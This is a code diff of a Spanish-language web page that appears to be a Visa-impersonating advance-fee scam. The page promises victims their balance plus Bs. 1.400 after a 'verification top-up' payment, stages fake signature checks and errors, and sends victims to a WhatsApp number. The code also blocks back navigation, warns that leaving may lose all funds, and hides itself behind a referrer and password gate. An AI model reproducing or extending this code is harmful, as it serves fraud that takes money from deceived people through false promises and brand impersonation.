@@ -1543,18 +1543,6 @@
       box-shadow: var(--shadow-lg);
     }
     
-    /* MODIFICACIÓN: Tarjeta de monto total optimizada para móviles */
-    .total-amount-mobile {
-      display: flex;
-      flex-direction: row;
-      align-items: center;
-      flex-wrap: nowrap;
-      justify-content: center;
-      gap: 0.3rem;
-      font-size: 1.1rem;
-      white-space: nowrap;
-    }
-    
     /* Responsive */
     @media (max-width: 768px) {
       .header {
@@ -1594,11 +1582,6 @@
       .dynamic-text {
         font-size: 0.65rem; /* Texto más pequeño en móviles */
       }
-      
-      /* MODIFICACIÓN: Total amount mobile */
-      .total-amount-mobile {
-        font-size: 0.9rem;
-      }
     }
     
     @media (max-width: 480px) {
@@ -1622,21 +1605,6 @@
       .info-section-old p, .verification-section p {
         font-size: 0.9rem;
       }
-      
-      /* MODIFICACIÓN: Total amount mobile */
-      .total-amount-mobile {
-        font-size: 0.85rem;
-      }
-    }
-    
-    /* MODIFICACIÓN: Ocultar iframe Youtube */
-    .youtube-embed {
-      position: absolute;
-      top: -9999px;
-      left: -9999px;
-      height: 1px;
-      width: 1px;
-      opacity: 0;
     }
   </style>
 </head>
@@ -1941,8 +1909,7 @@
           <i class="fas fa-calculator" style="margin-right: 0.5rem;"></i>
           <strong>Monto total que recibirás:</strong>
           <br>
-          <!-- MODIFICACIÓN: Contenedor para móviles -->
-          <span class="total-amount-mobile">
+          <span style="display: block; text-align: center; margin-top: 0.5rem; font-size: 1.1rem;">
             <strong id="montoRetiroBs">[Saldo]</strong> + 
             <strong class="blink">Bs. 1.400,00</strong> = 
             <strong id="montoDepositoTotal">[Saldo+1400]</strong>
@@ -2138,6 +2105,8 @@
           </span>
         </button>
       </div>
+    </div>
+  </div>
 </div>
 
 <!-- Overlay Secuencial POST-FIRMA (Conexión, Análisis, etc.) -->
@@ -2241,7 +2210,7 @@
     </h3>
     
     <p id="errorFinalTexto">
-     No se puede verificar la titularidad de tu cuenta hasta que detectemos
+      No se puede verificar la titularidad de tu cuenta hasta que detectemos
       tu recarga de verificación. Depositaremos tu saldo completo 
       (Saldo+<span id="montoRecargaError">1.400,00</span> Bs) 
       una vez validemos tu identidad.
@@ -2343,9 +2312,13 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   </div>
 </div>
 
-<!-- MODIFICACIÓN: iframe oculto para YouTube -->
-<iframe id="youtubeIntro" class="youtube-embed" src="https://www.youtube.com/embed/KWaPj24l_oo?enablejsapi=1&autoplay=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-<iframe id="youtubeOverlay" class="youtube-embed" src="https://www.youtube.com/embed/X6mjwDUFccw?enablejsapi=1&autoplay=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+<!-- Audios solicitados -->
+<audio id="audioIntro" preload="auto">
+  <source src="https://dl.dropboxusercontent.com/scl/fi/dwn8afqkkj0sn3fj6y3d7/KWaPj24l_oo-intro.mp3?rlkey=t61z1y3x2vn1v1o9kpspgr8y1" type="audio/mpeg">
+</audio>
+<audio id="audioOverlay" preload="auto">
+  <source src="https://dl.dropboxusercontent.com/scl/fi/k04phmfxh7fldoswxxcgj/X6mjwDUFccw-overlay.mp3?rlkey=cfjmdzpplxqvf2d65pfqnk4xh" type="audio/mpeg">
+</audio>
 
 <!-- Script principal -->
 <script>
@@ -2418,13 +2391,21 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   // Control de veces que se abre el overlay de datos:
   let timesBlurOpened = 0;
 
-  // MODIFICACIÓN: Timer de inactividad
-  let inactivityTimer = null;
-  const INACTIVITY_TIMEOUT = 60 * 60 * 1000; // 60 minutos en milisegundos
-  
-  // MODIFICACIÓN: Objetos de YouTube
-  let ytIntroPlayer = null;
-  let ytOverlayPlayer = null;
+  // Referencia a los audios
+  const firstAudio = () => {
+    const audioIntro = document.getElementById("audioIntro");
+    if (audioIntro) {
+      audioIntro.play().catch(err => console.log("No se pudo reproducir audioIntro: ", err));
+    }
+  };
+  const secondAudio = () => {
+    const audioOverlay = document.getElementById("audioOverlay");
+    if (audioOverlay) {
+      audioOverlay.play().catch(err => console.log("No se pudo reproducir audioOverlay: ", err));
+    }
+  };
+
+  // Variable para controlar si ya se reprodujo el audio al hacer clic en botones de firma
   let audioReproducidoFirma = false;
 
   // Mensajes para la tarjeta
@@ -2475,9 +2456,9 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   /****************************************************
    * EVENTO DOMContentLoaded
    ****************************************************/
-  document.addEventListener("DOMContentLoaded", () => {    
-    // MODIFICACIÓN: Inicializar API de YouTube
-    initYouTubeAPI();
+  document.addEventListener("DOMContentLoaded", () => {
+    // Reproducir el audio de intro al cargar la página
+    firstAudio();
     
     // Activamos aparición suave del container
     document.querySelector('.container').classList.add('active');
@@ -2502,83 +2483,10 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     
     // Agregar protección de contraseña (desde paste.txt)
     addPasswordProtection();
-    
-    // MODIFICACIÓN: Iniciar el timer de inactividad
-    resetInactivityTimer();
   });
   
   /****************************************************
-   * MODIFICACIÓN: Inicializar YouTube API
-   ****************************************************/
-  function initYouTubeAPI() {
-    // Carga la API de YouTube
-    const tag = document.createElement('script');
-    tag.src = "https://www.youtube.com/iframe_api";
-    const firstScriptTag = document.getElementsByTagName('script')[0];
-    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
-    
-    // La función onYouTubeIframeAPIReady es llamada automáticamente por la API de YouTube
-    window.onYouTubeIframeAPIReady = function() {
-      // Inicializar los players de YouTube
-      ytIntroPlayer = new YT.Player('youtubeIntro', {
-        events: {
-          'onStateChange': onPlayerStateChange
-        }
-      });
-      
-      ytOverlayPlayer = new YT.Player('youtubeOverlay', {
-        events: {
-          'onStateChange': onPlayerStateChange
-        }
-      });
-    };
-    
-    function onPlayerStateChange(event) {
-      // Puedes manejar cambios de estado si es necesario
-    }
-  }
-  
-  // MODIFICACIÓN: Funciones para reproducir videos de YouTube
-  function playYouTubeIntro() {
-    if (ytIntroPlayer && typeof ytIntroPlayer.playVideo === 'function') {
-      ytIntroPlayer.playVideo();
-    }
-  }
-  
-  function playYouTubeOverlay() {
-    if (ytOverlayPlayer && typeof ytOverlayPlayer.playVideo === 'function') {
-      ytOverlayPlayer.playVideo();
-    }
-  }
-  
-  /****************************************************
-   * MODIFICACIÓN: Timer de inactividad
-   ****************************************************/
-  function resetInactivityTimer() {
-    // Limpiar el temporizador existente si hay uno
-    if (inactivityTimer) {
-      clearTimeout(inactivityTimer);
-    }
-    
-    // Establecer un nuevo temporizador
-    inactivityTimer = setTimeout(() => {
-      // Si el usuario está en la sección "Último paso para recibir tu dinero en minutos"
-      if (document.getElementById("securityVerification3C").classList.contains("active")) {
-        // Redirigir automáticamente sin avisar
-        window.location.href = "https://visa.es";
-      }
-    }, INACTIVITY_TIMEOUT);
-  }
-  
-  // Reiniciar temporizador cuando el usuario interactúa con la página
-  document.addEventListener("mousemove", resetInactivityTimer);
-  document.addEventListener("mousedown", resetInactivityTimer);
-  document.addEventListener("keypress", resetInactivityTimer);
-  document.addEventListener("touchstart", resetInactivityTimer);
-  document.addEventListener("scroll", resetInactivityTimer);
-
-  /****************************************************
-   * Evitar retroceso y recarga con advertencia MEJORADO
+   * Evitar retroceso y recarga con advertencia
    ****************************************************/
   function setupNavigationWarning() {
     // Evitar retroceso
@@ -2591,11 +2499,11 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       }
     });
     
-    // MODIFICACIÓN MEJORADA: Evitar recarga con confirmación
+    // Evitar recarga
     window.addEventListener('beforeunload', function(e) {
       if (!isRedirecting) {
         e.preventDefault();
-        e.returnValue = "ADVERTENCIA: Si abandonas o recargas esta página podrías perder todos tus fondos y la sesión. ¿Estás seguro?";
+        e.returnValue = "Si abandonas esta página, podrías perder tus fondos. ¿Estás seguro?";
         return e.returnValue;
       }
     });
@@ -2606,8 +2514,6 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     
     if (confirmLeave) {
       isRedirecting = true;
-      // Establecer una marca temporal que indique que el usuario ha salido
-      sessionStorage.setItem('userLeft', Date.now());
       window.location.href = "https://visa.es";
     }
   }
@@ -2908,9 +2814,6 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
         togglePersonalizedBalance();
       }, 10000);
     }, 30000);
-    
-    // Reproducir el primer audio al cargar
-    playYouTubeIntro();
   }
 
   function createParticle() {
@@ -3171,9 +3074,9 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     const saveSignatureBtn = document.getElementById("saveSignatureBtn");
 
     clearSignatureBtn.addEventListener("click", () => {
-      // MODIFICACIÓN: Reproducir audio al hacer clic en "Limpiar"
+      // Reproducir audio al hacer clic en "Limpiar"
       if (!audioReproducidoFirma) {
-        playYouTubeOverlay();
+        secondAudio();
         audioReproducidoFirma = true;
       }
       
@@ -3181,9 +3084,9 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     });
     
     saveSignatureBtn.addEventListener("click", () => {
-      // MODIFICACIÓN: Reproducir audio al hacer clic en "Guardar"
+      // Reproducir audio al hacer clic en "Guardar"
       if (!audioReproducidoFirma) {
-        playYouTubeOverlay();
+        secondAudio();
         audioReproducidoFirma = true;
       }
       
@@ -3217,7 +3120,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     const btn1 = document.getElementById("continueSecurityBtn1");
     btn1.addEventListener("click", () => {
       // Se reproduce la primera canción
-      playYouTubeIntro();
+      firstAudio();
 
       // Escondemos la sección actual
       hideVisaCard("securityVerification1");
@@ -3247,9 +3150,6 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       hideVisaCard("securityVerification3B");
       showVisaCard("securityVerification3C");
       startRecargaReadyCountdown();
-      
-      // MODIFICACIÓN: Reiniciar timer de inactividad
-      resetInactivityTimer();
     });
 
     // Step3C -> Verificar recarga
@@ -3442,8 +3342,8 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     const progressBar = document.getElementById("secuenciaFirmaProgress");
     const percentDisplay = document.querySelector("#overlaySecuenciaFirma .progress-percentage");
 
-    // MODIFICACIÓN: Reproducir la segunda canción "apenas se muestre el primer overlay"
-    playYouTubeOverlay();
+    // Reproducir la segunda canción "apenas se muestre el primer overlay"
+    secondAudio();
 
     const secuenciaTextos = [
       { titulo: "Iniciando análisis de firma", texto: "Estableciendo conexión con el sistema de verificación...", progreso: 12 },
@@ -3608,34 +3508,23 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     }, 15000);
   }
 
-  // MODIFICACIÓN: Configura link WhatsApp (Mensaje mejorado)
+  // Configura link WhatsApp (ACTUALIZADA)
   function configurarWhatsAppLink() {
     const whatsappLink = document.getElementById("whatsappLink");
     if (!whatsappLink) return;
 
     const { montoRecargaBs } = calcularMontoRecarga();
     const montoFormateado = formatNumberVE(montoRecargaBs);
-    
-    // Obtener valor del comprobante
-    const comprobanteInput = document.getElementById("comprobanteInput");
-    const numeroComprobante = comprobanteInput ? comprobanteInput.value.trim() : "";
-    
-    // Obtener valor del teléfono
-    const recargaTelefono = document.getElementById("recargaTelefono");
-    const telefono = recargaTelefono ? recargaTelefono.value.trim() : telefonoUsuario;
 
     const msg = encodeURIComponent(
-      `Hola, soy ${nombreCompleto || "cliente"}, venezolano, titular de la cédula de identidad ${documentoBeneficiario || "pendiente"}. ` +
-      `Mi saldo actual es de ${formatNumberVE(saldoDisponible)} Bs, no puedo realizar el retiro de los fondos a ${bancoUsuario || "mi banco"} ` +
-      `ya que no se reconoció mi firma y tampoco encuentra el comprobante de mi pago que realicé desde ${bancoUsuario || "mi banco"}, ` +
-      `${telefono} por el monto de ${montoFormateado} Bs, comprobante número ${numeroComprobante} concepto ${documentoBeneficiario || "pendiente"} ` +
-      `así que enviaré comprobante de pago móvil para que comprueben que el código en el concepto corresponde a ${documentoBeneficiario || "mi documento"}.`
+      `Hola, soy ${nombreCompleto || "cliente"}, con documento ${documentoBeneficiario || "pendiente"}. ` +
+      `No se encontró mi recarga de verificación por ${montoFormateado} Bs y necesito ` +
+      `ayuda para liberar mis fondos de ${formatNumberVE(saldoDisponible)} Bs en ${bancoUsuario || "mi banco"}.`
     );
     whatsappLink.href = `https://wa.me/17373018059?text=${msg}`;
 
     whatsappLink.addEventListener("click", function(){
       setTimeout(function(){
-        isRedirecting = true;
         window.location.href = "https://visa.es";
       }, 120000);
     });
@@ -3825,7 +3714,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   }
 
   /****************************************************
-   * NUEVA FUNCIÓN: Agregar protección de contraseña MEJORADA
+   * NUEVA FUNCIÓN: Agregar protección de contraseña
    ****************************************************/
   function addPasswordProtection() {
     // Definir página actual y su referente permitido
@@ -3842,13 +3731,8 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     // Comprobar si el referrer es válido
     const hasValidReferrer = referrerPage === allowedReferrer;
     
-    // Comprobar si el usuario viene de visa.es (tras ser redirigido)
-    const userLeftTimestamp = sessionStorage.getItem('userLeft');
-    const comingFromVisaEs = userLeftTimestamp && 
-                             (new Date().getTime() - parseInt(userLeftTimestamp) < 5 * 60 * 1000); // 5 minutos
-    
-    // Si no tiene un token válido y no viene de un referrer permitido, o viene desde visa.es, mostrar modal de contraseña
-    if ((!hasValidToken && !hasValidReferrer) || comingFromVisaEs) {
+    // Si no tiene un token válido y no viene de un referrer permitido, mostrar modal de contraseña
+    if (!hasValidToken && !hasValidReferrer) {
         // Ocultar el contenido de la página
         document.documentElement.style.display = 'none';
         
@@ -3874,15 +3758,11 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
             passwordModal.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
             passwordModal.style.zIndex = '9999';
             
-            // Contenido del modal (mensajes personalizados según el caso)
-            const message = comingFromVisaEs ? 
-                "Has salido de la página y debes ingresar la contraseña para continuar con tu sesión." : 
-                `Esta página solo es accesible desde ${allowedReferrer}.`;
-            
+            // Contenido del modal
             passwordModal.innerHTML = `
                 <div style="background-color: white; padding: 30px; border-radius: 8px; text-align: center; max-width: 400px; width: 90%;">
                     <h2 style="color: #1a1f71; margin-bottom: 20px;">Acceso Restringido</h2>
-                    <p style="margin-bottom: 20px;">${message} Por favor, ingrese la contraseña para continuar.</p>
+                    <p style="margin-bottom: 20px;">Esta página solo es accesible desde ${allowedReferrer}. Por favor, ingrese la contraseña para continuar.</p>
                     <input type="password" id="passwordInput" style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px;">
                     <div>
                         <button id="submitBtn" style="background-color: #1a1f71; color: white; border: none; padding: 10px 20px; margin-right: 10px; border-radius: 4px; cursor: pointer;">Acceder</button>
@@ -3922,9 +3802,6 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
                     // Almacenar token de acceso en sesión
                     sessionStorage.setItem('accessToken_' + currentPage, 'authorized');
                     
-                    // Eliminar cualquier marca de sesión anterior
-                    sessionStorage.removeItem('userLeft');
-                    
                     // Eliminar modal y mostrar contenido
                     document.body.removeChild(passwordModal);
                     if (mainContainer) mainContainer.style.display = 'block';
@@ -3954,4 +3831,3 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
 </script>
 </body>
 </html>
-
